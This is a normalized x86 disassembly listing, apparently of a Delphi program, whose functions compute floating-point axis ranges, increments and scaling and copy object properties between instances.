mov [ edi + 0x94 ] 0x1
mov dl 0x1
mov eax edi
call sub_47b7e4
mov [ edi + 0x68 ] 0x1
mov eax [ edi + 0x90 ]
mov eax [ eax + 0x348 ]
mov edx edi
call sub_414210
xor eax eax
mov [ edi + 0x98 ] eax
mov [ edi + 0x9c ] eax
xor eax eax
mov [ edi + 0xa0 ] eax
mov [ edi + 0xa4 ] 0x40590000
xor eax eax
mov [ edi + 0xa8 ] eax
mov [ edi + 0xac ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_47b348
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov esi eax
mov eax [ ebp + 0x8 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
cmp [ esi + 0x68 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ esi + 0xc8 ] 0x0
je r-xdata
mov ecx edi
call sub_478ae4
pop edi
pop esi
pop ebp
retn 0xc
cmp al 0x12
jae r-xdata
mov al 0x1
sub_47b384
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] eax
mov eax [ esp ]
mov ebp [ eax + 0x90 ]
mov eax [ ebp + 0x2e8 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ esp ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x94 ]
test al al
je r-xdata
mov edx edi
mov eax ebp
call sub_483fd0
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ esp ]
cmp [ eax + 0x8e ] 0x0
je r-xdata
mov eax [ ebx + 0x8c ]
mov al [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebx + 0x84 ]
mov al [ eax + 0x4 ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_47b454
push ebx
push esi
call sub_4036d0
mov ebx edx
mov esi eax
mov eax [ esi + 0x78 ]
call sub_403344
mov eax [ esi + 0x7c ]
call sub_403344
mov eax [ esi + 0x80 ]
call sub_403344
mov eax [ esi + 0x3c ]
call sub_403344
mov eax [ esi + 0x6c ]
call sub_403344
mov eax [ esi + 0x28 ]
call sub_403344
mov eax [ esi + 0x30 ]
call sub_403344
mov eax [ esi + 0x48 ]
call sub_403344
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414988
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4036b8
sub_47b510
push ebp
mov ebp esp
add esp 0xfffffff8
mov eax [ ebp + 0x18 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8e ] 0x0
je r-xdata
mov eax [ ebp + 0x18 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8e ] 0x0
jne r-xdata
mov eax [ ebp + 0x18 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8d ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x18 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8d ] 0x0
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
fld [ ebp - 0x8 ]
pop ecx
pop ecx
pop ebp
retn 0x10
sub_47b578
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xdc ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xd4 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x4 ]
cmp [ edx + 0x8d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0xd8 ]
jne r-xdata
push ebp
mov eax [ ebp - 0x4 ]
push [ eax + 0xb4 ]
push [ eax + 0xb0 ]
mov eax [ ebp - 0x4 ]
push [ eax + 0xbc ]
push [ eax + 0xb8 ]
call sub_47b510
pop ecx
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
mov edx [ ebp - 0x4 ]
sub ebx [ edx + 0xd4 ]
mov [ ebp - 0x2c ] ebx
fild [ ebp - 0x2c ]
fstp [ ebp - 0x18 ]
fwait
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xd8 ]
sub edx ebx
mov [ ebp - 0x2c ] edx
fild [ ebp - 0x2c ]
fstp [ ebp - 0x18 ]
fwait
jmp r-xdata
lea ecx [ ebp - 0x20 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_47cf98
fstp [ ebp - 0x18 ]
fwait
fld [ ebp - 0x18 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
push ebp
mov eax [ ebp - 0x4 ]
push [ eax + 0xbc ]
push [ eax + 0xb8 ]
mov eax [ ebp - 0x4 ]
push [ eax + 0xb4 ]
push [ eax + 0xb0 ]
call sub_47b510
pop ecx
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
fld [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
fld [ eax + 0xb0 ]
fsub [ ebp - 0x18 ]
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
fld [ eax + 0xb8 ]
fadd [ ebp - 0x18 ]
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
fld [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
fmul [ edx + 0xc0 ]
mov [ ebp - 0x2c ] eax
fild [ ebp - 0x2c ]
fdivp st1
fstp [ ebp - 0x18 ]
fwait
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8e ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8d ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xb8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xbc ]
mov [ ebp - 0xc ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
sub ebx [ eax + 0xd4 ]
mov [ ebp - 0x2c ] ebx
fild [ ebp - 0x2c ]
fmul [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
fild [ eax + 0xdc ]
fdivp st1
fstp [ ebp - 0x18 ]
fwait
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xd8 ]
sub eax ebx
mov [ ebp - 0x2c ] eax
fild [ ebp - 0x2c ]
fmul [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
fild [ eax + 0xdc ]
fdivp st1
fstp [ ebp - 0x18 ]
fwait
jmp r-xdata
fld [ ebp - 0x28 ]
fsub [ ebp - 0x18 ]
call sub_402ac8
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
fld [ ebp - 0x20 ]
fadd [ ebp - 0x18 ]
call sub_402ac8
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8e ] 0x0
je r-xdata
sub_47b820
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov edi eax
push [ edi + 0xc ]
push [ edi + 0x8 ]
mov eax [ rw-data ]
push [ eax + 0x4 ]
push [ eax ]
call sub_476920
fstp [ esp ]
fwait
fld [ esp ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jbe r-xdata
push [ esp + 0x4 ]
push [ esp + 0x4 ]
mov eax [ rw-data ]
push [ eax + 0x4 ]
push [ eax ]
call sub_476920
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
jle r-xdata
fld [ edi + 0xc0 ]
fdiv [ esp ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jbe r-xdata
fld [ edi + 0xc0 ]
fdiv [ esp ]
call sub_402b00
mov ebx eax
cmp esi ebx
jge r-xdata
fld [ edi + 0xc0 ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
cmp esi ebx
jl r-xdata
fld [ esp ]
mov eax [ rw-data ]
fcomp [ eax + 0xc0 ]
fnstsw ax
sahf
jae r-xdata
fld [ r-xdata ]
fmul [ esp ]
fstp [ esp ]
fwait
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call sub_477224
fstp [ esp ]
fwait
jmp r-xdata
sub_47b8f4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffff0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fld [ eax + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
ja r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x8 ]
mov [ esi ] edx
mov edx [ eax + 0xc ]
mov [ esi + 0x4 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fld [ eax + 0xc0 ]
fabs
fstp [ esi ]
fwait
fld [ esi ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jae r-xdata
push [ esi + 0x4 ]
push [ esi ]
push 0x3d719799
push 0x812dea11
call sub_476920
fstp [ esi ]
fwait
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fld [ eax + 0xc0 ]
fdiv [ esi ]
fstp [ ebp - 0x8 ]
fwait
fld [ ebp - 0x8 ]
fabs
fld [ r-xdata ]
fcompp
fnstsw ax
sahf
jbe r-xdata
xor eax eax
mov [ esi ] eax
mov [ esi + 0x4 ] 0x3ff00000
jmp r-xdata
mov [ esi ] 0x812dea11
mov [ esi + 0x4 ] 0x3d719799
jmp r-xdata
push [ esi + 0x4 ]
push [ esi ]
call sub_478c18
fstp [ esi ]
fwait
fld [ ebp - 0x8 ]
call sub_402b00
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x14 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x14 ]
inc ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x50 ] 0x0
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x14 ]
jg r-xdata
push [ esi + 0x4 ]
push [ esi ]
call sub_478c18
fstp [ esi ]
fwait
jmp r-xdata
sub_47ba00
push ebp
mov ebp esp
add esp 0xffffffec
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x14 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc8 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xc8 ] 0x0
je r-xdata
mov [ ebp - 0x10 ] 0x812dea11
mov [ ebp - 0xc ] 0x3d719799
mov eax [ rw-data ]
mov edx [ eax ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x4 ]
mov [ ebp - 0xc ] edx
jmp r-xdata
push ebp
call sub_47b8f4
pop ecx
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_47b820
fstp [ ebp - 0x10 ]
fwait
jmp r-xdata
fld [ ebp - 0x10 ]
mov esp ebp
pop ebp
retn
sub_47ba6c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_47bae8
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_47c050
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x90 ]
call sub_477be4
mov esi eax
mov eax [ ebx + 0x44 ]
cmp eax 0x5a
je r-xdata
mov eax [ ebx + 0x90 ]
mov eax [ eax + 0x288 ]
call sub_472f94
mov esi eax
imul esi [ ebp - 0x4 ]
cmp eax 0x10e
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47baef
lea eax [ ebp - 0x8 ]
call sub_404094
retn
sub_47bafc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_47bb77
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_47c050
mov edx [ ebp - 0x8 ]
lea ecx [ ebp - 0x4 ]
mov eax [ ebx + 0x90 ]
call sub_477be4
mov esi eax
mov eax [ ebx + 0x44 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x90 ]
mov eax [ eax + 0x288 ]
call sub_472f94
mov esi eax
imul esi [ ebp - 0x4 ]
cmp eax 0xb4
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47bb7e
lea eax [ ebp - 0x8 ]
call sub_404094
retn
sub_47bbb0
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
test esi esi
jle r-xdata
mov eax 0x1
mov edi [ ebx + 0x50 ]
test edi edi
jle r-xdata
fild [ ebx + 0xdc ]
fmul [ r-xdata ]
mov [ esp + 0x8 ] esi
fild [ esp + 0x8 ]
fdivp st1
call sub_402b00
jmp r-xdata
mov [ esp + 0x8 ] edi
fild [ esp + 0x8 ]
fld [ r-xdata ]
fmulp st1
mov [ esp + 0xc ] esi
fild [ esp + 0xc ]
fmulp st1
call sub_402b00
add esi eax
mov edx eax
mov eax ebx
call sub_47ba00
fstp [ esp ]
fwait
fld [ esp ]
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_47bc30
push ebx
add esp 0xfffffff8
mov ebx eax
cmp [ ebx + 0x8e ] 0x0
je r-xdata
push [ ebx + 0xb4 ]
push [ ebx + 0xb0 ]
mov eax ebx
call sub_47bafc
push eax
push [ ebx + 0xbc ]
push [ ebx + 0xb8 ]
mov eax ebx
call sub_47bafc
pop edx
call sub_476954
push [ ebx + 0xb4 ]
push [ ebx + 0xb0 ]
mov eax ebx
call sub_47ba6c
push eax
push [ ebx + 0xbc ]
push [ ebx + 0xb8 ]
mov eax ebx
call sub_47ba6c
pop edx
call sub_476954
jmp r-xdata
mov edx eax
mov eax ebx
call sub_47bbb0
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_47bcb0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov edx [ edi ]
mov ebx [ edx + 0xd4 ]
mov edx [ edi ]
mov esi [ edx + 0xd8 ]
mov edx [ edi ]
add [ edx + 0xd4 ] eax
mov eax [ edi ]
mov edx [ ebp - 0x4 ]
sub [ eax + 0xd8 ] edx
mov eax [ edi ]
mov eax [ eax + 0xd8 ]
mov edx [ edi ]
sub eax [ edx + 0xd4 ]
mov edx [ edi ]
mov [ edx + 0xdc ] eax
mov eax [ edi ]
mov edx ebx
call sub_47b578
mov eax [ ebp + 0x8 ]
fstp [ eax - 0x10 ]
fwait
mov eax [ edi ]
mov edx esi
call sub_47b578
mov eax [ ebp + 0x8 ]
fstp [ eax - 0x18 ]
fwait
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_47bd24
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] eax
lea ebx [ ebp - 0x4 ]
mov eax [ ebx ]
cmp [ eax + 0x8e ] 0x0
je r-xdata
push ebp
mov eax [ edx + 0x4 ]
mov edx [ edx + 0xc ]
call sub_47bcb0
pop ecx
push ebp
mov eax [ edx ]
mov edx [ edx + 0x8 ]
call sub_47bcb0
pop ecx
jmp r-xdata
mov eax [ ebx ]
fld [ eax + 0xb0 ]
mov eax [ ebx ]
fsub [ eax + 0xb8 ]
mov eax [ ebx ]
fstp [ eax + 0xc0 ]
fwait
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
lea edx [ eax + 0xb0 ]
mov eax [ ebx ]
add eax 0xb8
call sub_476964
mov eax [ ebx ]
call sub_47d414
mov eax [ ebx ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0xb8 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0xbc ] edx
mov eax [ ebx ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0xb0 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0xb4 ] edx
mov eax [ ebx ]
fld [ eax + 0xb8 ]
mov eax [ ebx ]
fcomp [ eax + 0xb0 ]
fnstsw ax
sahf
jbe r-xdata
sub_47bdd0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov al [ ebx + 0x8e ]
push eax
xor ecx ecx
mov edx ebx
mov eax [ ebx + 0x90 ]
call sub_483a4c
fstp [ edi ]
fwait
cmp [ ebx + 0x5 ] 0x0
je r-xdata
mov al [ ebx + 0x8e ]
push eax
mov cl 0x1
mov edx ebx
mov eax [ ebx + 0x90 ]
call sub_483a4c
fstp [ esi ]
fwait
cmp [ ebx + 0x6 ] 0x0
je r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
sub_47be28
push ebx
mov ebx eax
lea ecx [ ebx + 0x10 ]
lea edx [ ebx + 0x18 ]
mov eax ebx
call sub_47bdd0
mov eax [ ebx + 0x10 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0x14 ]
mov [ ebx + 0xb4 ] eax
mov eax [ ebx + 0x18 ]
mov [ ebx + 0xb8 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebx + 0xbc ] eax
fld [ ebx + 0xb0 ]
fsub [ ebx + 0xb8 ]
fstp [ ebx + 0xc0 ]
fwait
pop ebx
retn
sub_47be74
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4149b4
mov edi esi
mov edx [ edi + 0x28 ]
mov eax [ ebx + 0x28 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov al [ edi + 0x41 ]
mov [ ebx + 0x41 ] al
mov eax [ edi + 0x44 ]
mov [ ebx + 0x44 ] eax
mov edx [ edi + 0x48 ]
mov eax [ ebx + 0x48 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov al [ edi + 0x6a ]
mov [ ebx + 0x6a ] al
mov eax [ edi + 0x50 ]
mov [ ebx + 0x50 ] eax
mov eax [ edi + 0x54 ]
mov [ ebx + 0x54 ] eax
mov al [ edi + 0x58 ]
mov [ ebx + 0x58 ] al
mov al [ edi + 0x4c ]
mov [ ebx + 0x4c ] al
mov edx [ edi + 0x7c ]
mov eax [ ebx + 0x7c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ edi + 0x80 ]
mov eax [ ebx + 0x80 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ edi + 0x34 ]
mov [ ebx + 0x34 ] eax
mov edx [ edi + 0x3c ]
mov eax [ ebx + 0x3c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ edi + 0x78 ]
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ edi + 0x6c ]
mov eax [ ebx + 0x6c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ edi + 0x88 ]
mov [ ebx + 0x88 ] eax
mov eax [ edi + 0x74 ]
mov [ ebx + 0x74 ] eax
mov eax [ edi + 0x70 ]
mov [ ebx + 0x70 ] eax
mov eax [ edi + 0x84 ]
mov [ ebx + 0x84 ] eax
lea eax [ ebx + 0x60 ]
mov edx [ edi + 0x60 ]
call sub_4040e8
mov eax [ edi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
mov eax [ edi + 0x10 ]
mov [ ebx + 0x10 ] eax
mov eax [ edi + 0x14 ]
mov [ ebx + 0x14 ] eax
mov eax [ edi + 0x18 ]
mov [ ebx + 0x18 ] eax
mov eax [ edi + 0x1c ]
mov [ ebx + 0x1c ] eax
mov al [ edi + 0x4 ]
mov [ ebx + 0x4 ] al
mov al [ edi + 0x5 ]
mov [ ebx + 0x5 ] al
mov al [ edi + 0x6 ]
mov [ ebx + 0x6 ] al
mov edx [ edi + 0x30 ]
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea eax [ ebx + 0x64 ]
mov edx [ edi + 0x64 ]
call sub_4040e8
mov al [ edi + 0x40 ]
mov [ ebx + 0x40 ] al
mov al [ edi + 0x20 ]
mov [ ebx + 0x20 ] al
mov eax [ edi + 0x24 ]
mov [ ebx + 0x24 ] eax
mov al [ edi + 0x8d ]
mov [ ebx + 0x8d ] al
mov al [ edi + 0x68 ]
mov [ ebx + 0x68 ] al
mov al [ edi + 0x69 ]
mov [ ebx + 0x69 ] al
mov al [ edi + 0x8c ]
mov [ ebx + 0x8c ] al
mov al [ edi + 0xe0 ]
mov [ ebx + 0xe0 ] al
mov eax [ edi + 0x98 ]
mov [ ebx + 0x98 ] eax
mov eax [ edi + 0x9c ]
mov [ ebx + 0x9c ] eax
mov eax [ edi + 0xa0 ]
mov [ ebx + 0xa0 ] eax
mov eax [ edi + 0xa4 ]
mov [ ebx + 0xa4 ] eax
mov eax [ edi + 0xa8 ]
mov [ ebx + 0xa8 ] eax
mov eax [ edi + 0xac ]
mov [ ebx + 0xac ] eax
mov al [ edi + 0x94 ]
mov [ ebx + 0x94 ] al
mov al [ edi + 0x8e ]
mov [ ebx + 0x8e ] al
mov al [ edi + 0x8f ]
mov [ ebx + 0x8f ] al
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_47c050
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47c124
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0xc8 ] 0x0
je r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
mov edx esi
mov eax [ ebx + 0x60 ]
call sub_409b14
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
push 0xffffffff
push esi
mov edi eax
xor ecx ecx
mov edx ebx
mov eax [ edi + 0x30c ]
call [ edi + 0x308 ]
mov eax esi
call sub_404094
jmp r-xdata
cmp [ ebx + 0x64 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c12b
lea eax [ ebp - 0x4 ]
call sub_404094
retn
mov eax esi
mov edx r-xdata
call sub_4788e4
mov eax [ ebx + 0x90 ]
cmp [ eax + 0x30a ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x64 ]
call sub_40412c
push [ ebx + 0xc4 ]
push [ ebx + 0xc0 ]
lea eax [ ebp - 0x4 ]
call sub_4771e4
jmp r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40ab8c
jmp r-xdata
sub_47c144
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov ebx eax
mov al [ ebx + 0x58 ]
test al al
jne r-xdata
mov [ esp ] al
cmp [ ebx + 0xe0 ] 0x0
je r-xdata
mov [ esp ] 0x1
mov eax [ ebx + 0x90 ]
mov eax [ eax + 0x2e8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov [ esp ] 0x4
mov esi [ ebx + 0x90 ]
mov eax [ esi + 0x2e8 ]
call sub_483500
test eax eax
jle r-xdata
mov al [ esp ]
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov eax [ esi + 0x2e8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
inc ebp
dec edi
jne r-xdata
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x94 ]
test al al
je r-xdata
inc edi
xor ebp ebp
mov edx ebp
mov eax [ ebx + 0x90 ]
call sub_483fd0
mov esi eax
cmp [ esi + 0x30 ] 0x0
je r-xdata
jmp r-xdata
mov [ esp ] 0x2
cmp [ ebx + 0x8e ] 0x0
je r-xdata
inc ebp
dec edi
jne r-xdata
cmp [ ebx + 0xfb ] 0x0
jne r-xdata
cmp [ ebx + 0x8e ] 0x0
jne r-xdata
mov eax esi
call sub_480b24
test al al
jne r-xdata
mov edx ebp
mov eax esi
call sub_483fd0
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
je r-xdata
jmp r-xdata
mov [ esp ] 0x2
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
fstp [ esp + 0x4 ]
fwait
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
fcomp [ esp + 0x4 ]
fnstsw ax
sahf
je r-xdata
mov eax esi
call sub_480b24
test al al
jne r-xdata
mov eax [ esi + 0x88 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
mov eax [ esi + 0x88 ]
call sub_4143b4
test eax eax
je r-xdata
mov [ esp ] 0x4
jmp r-xdata
sub_47c288
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
xor eax eax
push ebp
push sub_47c3ff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_47b384
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x69 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x68 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0xb8 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0xbc ]
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0xb0 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0xb4 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_47bc30
fstp [ ebp - 0x8 ]
fwait
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fld [ eax + 0xb8 ]
fdiv [ ebp - 0x8 ]
call sub_402ae0
fmul [ ebp - 0x8 ]
fstp [ ebp - 0x10 ]
fwait
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fld [ eax + 0xb0 ]
fdiv [ ebp - 0x8 ]
call sub_402ae0
fmul [ ebp - 0x8 ]
fstp [ ebp - 0x18 ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x90 ]
mov eax [ ebx + 0x308 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebx + 0x30c ]
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebx + 0x308 ] eax
mov [ ebx + 0x30c ] eax
mov esi [ ebx + 0x288 ]
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_47c050
mov edx [ ebp - 0x28 ]
lea ecx [ ebp - 0x24 ]
mov eax ebx
call sub_477be4
push eax
push [ ebp - 0xc ]
push [ ebp - 0x10 ]
lea edx [ ebp - 0x2c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_47c050
mov edx [ ebp - 0x2c ]
lea ecx [ ebp - 0x24 ]
mov eax ebx
call sub_477be4
pop edx
call sub_476954
mov edi eax
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x60 ]
add edi eax
mov esi edi
mov eax [ ebp - 0x20 ]
mov [ ebx + 0x308 ] eax
mov eax [ ebp - 0x1c ]
mov [ ebx + 0x30c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c406
lea eax [ ebp - 0x2c ]
mov edx 0x2
call sub_4040b8
retn
sub_47c41c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_47c144
sub al 0x2
je r-xdata
push ebp
call sub_47c288
pop ecx
pop ecx
pop ebp
retn
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
call sub_483f80
pop ecx
pop ebp
retn
dec al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x90 ]
call sub_483eb4
pop ecx
pop ebp
retn
jmp r-xdata
xor eax eax
pop ecx
pop ebp
retn
sub_47c4a0
push ebx
push esi
mov ebx edx
mov esi eax
lea edx [ esi + 0x4 ]
mov ecx ebx
mov eax [ esi + 0x90 ]
call sub_477b20
mov eax [ esi + 0x90 ]
test [ eax + 0x1c ] 0x1
